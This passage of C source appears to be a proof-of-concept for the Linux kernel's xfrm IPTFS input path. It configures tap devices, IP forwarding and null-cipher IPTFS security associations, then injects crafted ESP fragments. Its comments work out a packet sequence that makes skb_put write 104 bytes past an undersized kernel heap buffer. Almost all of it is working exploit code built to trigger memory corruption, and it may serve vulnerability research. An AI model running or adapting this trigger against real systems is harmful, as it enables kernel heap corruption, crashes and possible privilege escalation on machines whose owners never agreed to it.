	static u8 hdr[64];
	static u8 pay[4096];
	struct iovec iov[1 + V_MAX_SKB_FRAGS + 4];
	int i, paylen = nf * chunk;
	u8 *e = hdr;
	u8 *ip = hdr + 14;
	u8 *ud = hdr + 34;

	memset(hdr, 0, sizeof hdr);
	memset(pay, 0x41, sizeof pay);
	memcpy(e, mac0, 6);                 /* dst mac = tap0's own mac */
	e[6] = 0x02; e[11] = 0x33;          /* some src mac */
	e[12] = 0x08; e[13] = 0x00;         /* ETH_P_IP */

	ip[0] = 0x45;
	ip[2] = (u8)((20 + 8 + paylen) >> 8);
	ip[3] = (u8)(20 + 8 + paylen);
	ip[8] = 64;                         /* ttl, must be > 1 to forward */
	ip[9] = 17;                         /* IPPROTO_UDP */
	*(u32 *)(ip + 12) = htonl(RX_SRC);
	*(u32 *)(ip + 16) = htonl(IN_DST);
	*(u16 *)(ip + 10) = 0;
	*(u16 *)(ip + 10) = ipcsum(ip, 20);

	*(u16 *)(ud + 0) = htons(sport);
	*(u16 *)(ud + 2) = htons(7777);
	*(u16 *)(ud + 4) = htons((u16)(8 + paylen));
	*(u16 *)(ud + 6) = 0;               /* no udp checksum */

	iov[0].iov_base = hdr;
	iov[0].iov_len = 42;
	for (i = 0; i < nf; i++) {
		iov[1 + i].iov_base = pay;
		iov[1 + i].iov_len = chunk;
	}
	return (int)writev(tapfd, iov, 1 + nf);
}

/* Send one ESP/IPTFS packet as N IP FRAGMENTS. ip_defrag reassembles them into
 * a skb with a frag_list, i.e. a NON-LINEAR ESP skb - which is what makes
 * skb_copy_seq_read step its offset, so __input_process_payload:1042
 * `if (unlikely(skbseq->stepped_offset))` becomes true and 1046-1049 run.
 * It also satisfies `skb->len == skb->data_len` at 902 without head_frag.
 * No capability needed, unlike IFF_NAPI_FRAGS. */
static int send_esp_frags(int tapfd, u32 spi, u32 seq, u16 blkoff, int ninner,
			  int innerlen, int nfrag)
{
	static u8 pl[4096];
	static u8 f[2048];
	int plen = 0, i, piece, off, sentn = 0;
	static u16 ipid = 0x4000;

	memset(pl, 0, sizeof pl);
	/* ESP header + IPTFS header + inner packets + ESP trailer */
	*(u32 *)(pl + 0) = htonl(spi);
	*(u32 *)(pl + 4) = htonl(seq);
	plen = 8;
	pl[plen + 0] = 0;
	pl[plen + 1] = 0;
	*(u16 *)(pl + plen + 2) = htons(blkoff);
	plen += 4;
	for (i = 0; i < ninner; i++) {
		u8 *in = pl + plen;
		if (plen + innerlen > (int)sizeof pl - 8)
			break;
		in[0] = 0x45;
		in[2] = (u8)(innerlen >> 8);
		in[3] = (u8)innerlen;
		in[8] = 64;
		in[9] = 17;
		*(u32 *)(in + 12) = htonl(0x0a640001u);
		*(u32 *)(in + 16) = htonl(0x0a640002u);
		*(u16 *)(in + 10) = ipcsum(in, 20);
		plen += innerlen;
	}
	pl[plen++] = 0;
	pl[plen++] = V_IPPROTO_AGGFRAG;

	ipid++;
	piece = ((plen / nfrag) + 7) & ~7;        /* 8-byte multiples */
	if (piece < 8)
		piece = 8;
	for (off = 0; off < plen; off += piece) {
		int this = plen - off;
		int more = 0;
		u8 *e = f, *ip = f + 14;
		if (this > piece) { this = piece; more = 1; }
		memset(f, 0, sizeof f);
		memcpy(e, mac0, 6);
		e[6] = 0x02; e[11] = 0x66;
		e[12] = 0x08; e[13] = 0x00;
		ip[0] = 0x45;
		*(u16 *)(ip + 2) = htons((u16)(20 + this));
		*(u16 *)(ip + 4) = htons(ipid);
		*(u16 *)(ip + 6) = htons((u16)((off / 8) | (more ? 0x2000 : 0)));
		ip[8] = 64;
		ip[9] = V_IPPROTO_ESP;
		*(u32 *)(ip + 12) = htonl(RX_PEER);
		*(u32 *)(ip + 16) = htonl(RX_LOCAL);
		*(u16 *)(ip + 10) = ipcsum(ip, 20);
		memcpy(f + 34, pl + off, (size_t)this);
		if (write(tapfd, f, (size_t)(34 + this)) > 0)
			sentn++;
	}
	return sentn;
}

/* Deliver a prebuilt IPTFS payload as N IP fragments, so ip_defrag hands xfrm a
 * skb with a frag_list. That matters twice over: it makes skb_seq_read step
 * between sub-skbs so stepped_offset becomes non-zero and the reset at
 * xfrm_iptfs.c:1046-1049 fires (which coverage already confirms it does), and it
 * makes skb_has_frag_list(skb) true so :901 refuses the fragwalk and the
 * continuation must take the skb_put path at :920. */
static int send_payload_frags(int tapfd, u32 spi, u32 seq,
			      const u8 *pl, int plen, int firstfrag)
{
	static u8 buf[8192];
	static u8 f[2048];
	static u16 ipid = 0x7000;
	int n = 0, off, piece, sentn = 0;

	memset(buf, 0, sizeof buf);
	*(u32 *)(buf + 0) = htonl(spi);
	*(u32 *)(buf + 4) = htonl(seq);
	n = 8;
	memcpy(buf + n, pl, (size_t)plen);
	n += plen;
	buf[n++] = 0;
	buf[n++] = V_IPPROTO_AGGFRAG;

	ipid++;
	for (off = 0; off < n; off += piece) {
		int this, more = 0;
		u8 *e = f, *ip = f + 14;
		piece = (off == 0) ? firstfrag : 1400;
		piece &= ~7;
		if (piece < 8)
			piece = 8;
		this = n - off;
		if (this > piece) { this = piece; more = 1; }
		memset(f, 0, sizeof f);
		memcpy(e, mac0, 6);
		e[6] = 0x02; e[11] = 0x88;
		e[12] = 0x08; e[13] = 0x00;
		ip[0] = 0x45;
		*(u16 *)(ip + 2) = htons((u16)(20 + this));
		*(u16 *)(ip + 4) = htons(ipid);
		*(u16 *)(ip + 6) = htons((u16)((off / 8) | (more ? 0x2000 : 0)));
		ip[8] = 64;
		ip[9] = V_IPPROTO_ESP;
		*(u32 *)(ip + 12) = htonl(RX_PEER);
		*(u32 *)(ip + 16) = htonl(RX_LOCAL);
		*(u16 *)(ip + 10) = ipcsum(ip, 20);
		memcpy(f + 34, buf + off, (size_t)this);
		if (write(tapfd, f, (size_t)(34 + this)) > 0)
			sentn++;
	}
	return sentn;
}

/* Plain (un-fragmented) delivery of a prebuilt IPTFS payload. Small enough to
 * stay under a page, and with TUNSETSNDBUF = INT_MAX this takes tun_build_skb,
 * so the ESP skb has head_frag == 1 - which is what xfrm_iptfs.c:1109 requires
 * to set up the fragwalk and so take the SHARE path at :1137, where
 * iptfs_pskb_add_frags allocates the reassembly buffer with only
 * copy_len = iphlen (:546). That undersized allocation is the whole point. */
static int send_payload_plain(int tapfd, u32 spi, u32 seq,
			      const u8 *pl, int plen)
{
	static u8 f[4096];
	int n = 0;
	u8 *ip, *e;

	memset(f, 0, sizeof f);
	e = f; n = 14;
	ip = f + n; n += 20;
	*(u32 *)(f + n) = htonl(spi); n += 4;
	*(u32 *)(f + n) = htonl(seq); n += 4;
	memcpy(f + n, pl, (size_t)plen); n += plen;
	f[n++] = 0;
	f[n++] = V_IPPROTO_AGGFRAG;

	memcpy(e, mac0, 6);
	e[6] = 0x02; e[11] = 0x99;
	e[12] = 0x08; e[13] = 0x00;
	ip[0] = 0x45;
	*(u16 *)(ip + 2) = htons((u16)(n - 14));
	*(u16 *)(ip + 4) = htons(0x6100);
	ip[8] = 64;
	ip[9] = V_IPPROTO_ESP;
	*(u32 *)(ip + 12) = htonl(RX_PEER);
	*(u32 *)(ip + 16) = htonl(RX_LOCAL);
	*(u16 *)(ip + 10) = ipcsum(ip, 20);
	return (int)write(tapfd, f, (size_t)n);
}

int main(void)
{
	int cs, t0, t1, us, r;
	struct vsa *sa;
	struct vpol *po;
	struct vtmpl tm;
	struct valgo al;
	struct ifreq ifr;
	struct sockaddr_in d;
	char payload[8];

	cs = socket(AF_INET, SOCK_DGRAM, 0);
	if (cs < 0) { printf("ctl socket errno=%d\n", errno); return 1; }

	t0 = open_tap("tap0", V_IFF_TAP | V_IFF_NO_PI);
	if (t0 < 0) return 1;
	t1 = open_tap("tap1", V_IFF_TAP | V_IFF_NO_PI);
	if (t1 < 0) return 1;
	printf("tap0=%d tap1=%d build_skb_path\n", t0, t1);

	memset(&ifr, 0, sizeof ifr);
	strncpy(ifr.ifr_name, "tap0", IFNAMSIZ - 1);
	if (ioctl(cs, V_SIOCGIFHWADDR, &ifr) < 0)
		printf("GIFHWADDR errno=%d\n", errno);
	memcpy(mac0, ifr.ifr_hwaddr.sa_data, 6);
	printf("tap0 mac %02x:%02x:%02x:%02x:%02x:%02x\n",
	       mac0[0], mac0[1], mac0[2], mac0[3], mac0[4], mac0[5]);

	r = set_if(cs, "tap0", 0x0a460001u, 0xffffff00u);   /* 10.70.0.1/24 */
	printf("set tap0 r=%d\n", r);
	r = set_if(cs, "tap1", 0x0a500001u, 0xffffff00u);   /* 10.80.0.1/24 */
	printf("set tap1 r=%d\n", r);

	wr_sysctl("/proc/sys/net/ipv4/ip_forward", "1\n");
	wr_sysctl("/proc/sys/net/ipv4/conf/all/forwarding", "1\n");
	wr_sysctl("/proc/sys/net/ipv4/conf/tap0/forwarding", "1\n");
	wr_sysctl("/proc/sys/net/ipv4/conf/tap1/forwarding", "1\n");
	wr_sysctl("/proc/sys/net/ipv4/conf/all/rp_filter", "0\n");
	wr_sysctl("/proc/sys/net/ipv4/conf/tap0/rp_filter", "0\n");

	nlfd = socket(AF_NETLINK, SOCK_RAW, V_NETLINK_XFRM);
	if (nlfd < 0) { printf("xfrm netlink errno=%d\n", errno); return 1; }

	/* ---- the SA: mode IPTFS, out direction, with an init delay so more than
	 * one packet is in the queue when the delay timer fires ---- */
	m_begin();
	sa = m_body(sizeof *sa);
	sa->sel.family = 0;                 /* 0 = match any flow */
	sa->id.daddr.a4 = htonl(OUT_D);
	sa->id.spi = htonl(SPI);
	sa->id.proto = V_IPPROTO_ESP;
	sa->saddr.a4 = htonl(OUT_S);
	sa->lft.sb = sa->lft.hb = sa->lft.sp = sa->lft.hp = ~(u64)0;
	/* 0 means "never" for the TIME limits.  ~0ULL does NOT: xfrm_timer_handler
	 * computes hard_add_expires_seconds + add_time - now, which with ~0ULL is
	 * -1 + add_time - now <= 0, so the SA expires at the first mtimer tick and
	 * iptfs_destroy_state() cancels the delay timer and kfrees the queue. */
	sa->lft.sa = sa->lft.ha = sa->lft.su = sa->lft.hu = 0;
	sa->reqid = REQID;
	sa->family = AF_INET;
	sa->mode = V_XFRM_MODE_IPTFS;
	sa->replay_window = 0;              /* must be 0 for an output SA */
	memset(&al, 0, sizeof al);
	strcpy(al.name, "ecb(cipher_null)");
	al.keylen = 0;
	m_attr(V_XFRMA_ALG_CRYPT, &al, 68);
	memset(&al, 0, sizeof al);
	strcpy(al.name, "digest_null");
	al.keylen = 0;
	m_attr(V_XFRMA_ALG_AUTH, &al, 68);
	{ u8 dir = V_XFRM_SA_DIR_OUT; m_attr(V_XFRMA_SA_DIR, &dir, 1); }
	{ u32 v = INIT_DELAY_US; m_attr(V_XFRMA_IPTFS_INIT_DELAY, &v, 4); }
	{ u32 v = 0x4000000u;     m_attr(V_XFRMA_IPTFS_MAX_QSIZE, &v, 4); }
	r = m_send(V_XFRM_MSG_NEWSA);
	printf("NEWSA iptfs out r=%d\n", r);

	/* ---- the OUT policy for the inner subnet ---- */
	m_begin();
	po = m_body(sizeof *po);
	po->sel.daddr.a4 = htonl(IN_NET);
	po->sel.prefixlen_d = 24;
	po->sel.prefixlen_s = 0;
	po->sel.family = AF_INET;
	po->lft.sb = po->lft.hb = po->lft.sp = po->lft.hp = ~(u64)0;
	po->lft.sa = po->lft.ha = po->lft.su = po->lft.hu = 0;
	po->priority = 1;
	po->dir = V_XFRM_POLICY_OUT;
	po->action = 0;
	po->share = 0;
	memset(&tm, 0, sizeof tm);
	tm.id.daddr.a4 = htonl(OUT_D);
	tm.id.spi = htonl(SPI);
	tm.id.proto = V_IPPROTO_ESP;
	tm.family = AF_INET;
	tm.saddr.a4 = htonl(OUT_S);
	tm.reqid = REQID;
	tm.mode = V_XFRM_MODE_IPTFS;
	tm.optional = 0;
	tm.aalgos = tm.ealgos = tm.calgos = 0xffffffffu;
	m_attr(V_XFRMA_TMPL, &tm, sizeof tm);
	r = m_send(V_XFRM_MSG_NEWPOLICY);
	printf("NEWPOLICY out r=%d\n", r);

	/* ---- INPUT side: an IPTFS input SA, then crafted ESP/IPTFS frames
	 * written INTO tap0 so each arrives as a received skb (head_frag = 1 via
	 * tun_build_skb).  The ESP sequence numbers are the reorder key, and
	 * replay_window 0 disables anti-replay so out-of-order ones reach
	 * iptfs_input_reorder.  This path, unlike the output path, records
	 * distances - and it holds the sites that already carry end_min 0. ---- */
	/* One input SA per reorder window, each with its own SPI, so a single run
	 * measures every window size.  w_saved is reorder_win_size * 16 bytes, and
	 * __vec_shift's memset at 1318 spans shift*16 at w_saved + (savedlen-shift)
	 * - so the window is the knob that decides the object AND the copy length,
	 * which is why 1318 reads its_length_is_an_input with size_min 0. */
	t_start_ms = now_ms();
	mark("before");
	{
		u32 win = 64;
		u32 spi = IN_SPI;
		u32 s = 51000;
		int rr = mk_in_sa(spi, win, 0u, RX_PEER);
		int ok = 0, sent = 0, k;
		static u8 q1[2048], q2[8192];
		printf("NEWSA iptfs IN reorder=%u r=%d\n", win, rr);
		if (!rr) {
			/* Measured operands say the share path IS taken and the
			 * continuations simply ADD frags (:911), which is why nothing
			 * overflowed: adding frags grows skb->len without touching the
			 * linear tailroom. :441 is the way into the skb_put path -
			 * once newskb->shinfo->nr_frags reaches MAX_SKB_FRAGS,
			 * can_add_frags returns false, so :912 linearizes and :920
			 * skb_puts copylen into a buffer that was only ever sized
			 * copy_len = iphlen at :546.
			 *
			 * T  = 3800 declared inner total
			 * C1 = 1000 carried by packet 1 (1 frag, len 1000)
			 * then 16 continuations of 100 bytes each: len 2600, 17 frags
			 * then one continuation of 1200: can_add_frags fails on the
			 * 18th frag, skb_linearize gives
			 *   pskb_expand_head(0, 2488+128) -> SKB_DATA_ALIGN(2816)+320
			 *   = 3136 -> kmalloc-4096 -> SKB_WITH_OVERHEAD 3776
			 *   -> usable 3696, len 2600, tailroom 1096
			 * and skb_put(1200) is 104 bytes past the end.
			 *
			 * :863 only rejects blkoff < ipremain, so every continuation
			 * declares a blkoff covering the whole remainder while
			 * actually carrying less - that is what keeps reassembly
			 * alive across 17 packets instead of completing at once. */
			const int T = 3800, C1 = 1000;
			int plen1, D, len_now = C1;
			u8 *in;
			ok++;
			memset(q1, 0x5a, sizeof q1);
			q1[0] = 0; q1[1] = 0;
			*(u16 *)(q1 + 2) = htons(0);
			in = q1 + 4;
			in[0] = 0x45;
			*(u16 *)(in + 2) = htons((u16)T);
			in[8] = 64; in[9] = 17;
			*(u32 *)(in + 12) = htonl(0x0a640001u);
			*(u32 *)(in + 16) = htonl(0x0a640002u);
			*(u16 *)(in + 10) = ipcsum(in, 20);
			plen1 = 4 + C1;
			if (send_payload_plain(t0, spi, s++, q1, plen1) > 0)
				sent++;
			printf("pkt1 T=%d carried=%d len->%d frags->1\n", T, C1, len_now);
			/* 16 small continuations, one added frag each */
			for (k = 0; k < 16; k++) {
				int chunk = 100, bo = T - len_now;
				memset(q2, 0x5a, sizeof q2);
				q2[0] = 0; q2[1] = 0;
				*(u16 *)(q2 + 2) = htons((u16)bo);
				if (send_payload_plain(t0, spi, s++, q2, 4 + chunk) > 0)
					sent++;
				len_now += chunk;
			}
			printf("after 16 continuations len->%d frags->17 ipremain=%d\n",
			       len_now, T - len_now);
			/* the one that must fail can_add_frags and take :920 */
			{
				int big = T - len_now, bo = big;
				memset(q2, 0x5a, sizeof q2);
				q2[0] = 0; q2[1] = 0;
				*(u16 *)(q2 + 2) = htons((u16)bo);
				if (send_payload_plain(t0, spi, s++, q2,
						       4 + big + 100) > 0)
					sent++;
				printf("final continuation blkoff=%d copylen->%d "
				       "onto len=%d\n", bo, big, len_now);
			}
			printf("IptfsErr=%ld BufErr=%ld InErr=%ld\n",
			       xfrm_stat("XfrmInIptfsError"),
			       xfrm_stat("XfrmInBufferError"),
			       xfrm_stat("XfrmInError"));
		}
		printf("  sent=%d NoStates=%ld IptfsErr=%ld InErr=%ld BufErr=%ld ok=%d\n",
		       sent, xfrm_stat("XfrmInNoStates"), xfrm_stat("XfrmInIptfsError"),
		       xfrm_stat("XfrmInError"), xfrm_stat("XfrmInBufferError"), ok);
	}
	printf("XfrmInIptfsError=%ld XfrmInError=%ld XfrmInBufferError=%ld XfrmInStateModeError=%ld\n",
	       xfrm_stat("XfrmInIptfsError"), xfrm_stat("XfrmInError"),
	       xfrm_stat("XfrmInBufferError"), xfrm_stat("XfrmInStateModeError"));
	printf("XfrmInNoStates=%ld XfrmInStateDirError=%ld XfrmInStateSeqError=%ld\n",
	       xfrm_stat("XfrmInNoStates"), xfrm_stat("XfrmInStateDirError"),
	       xfrm_stat("XfrmInStateSeqError"));


	/* The delay timer was armed for INIT_DELAY_US when the first packet was
	 * queued.  Sample the counter across that window: an ESP packet appearing
	 * just after the delay is iptfs_output_queued having run on the timer. */
	{
		int i;
		static const int ms[] = { 20, 60, 150, 400, 1200, 2200 };
		for (i = 0; i < (int)(sizeof ms / sizeof ms[0]); i++) {
			struct timespec req;
			long want = ms[i] - (now_ms() - t_start_ms);
			if (want > 0) {
				req.tv_sec = want / 1000;
				req.tv_nsec = (want % 1000) * 1000000L;
				while (nanosleep(&req, &req) < 0 && errno == EINTR)
					;
			}
			mark("sample");
		}
	}
	mark("after");
	printf("done\n");
	return 0;
}
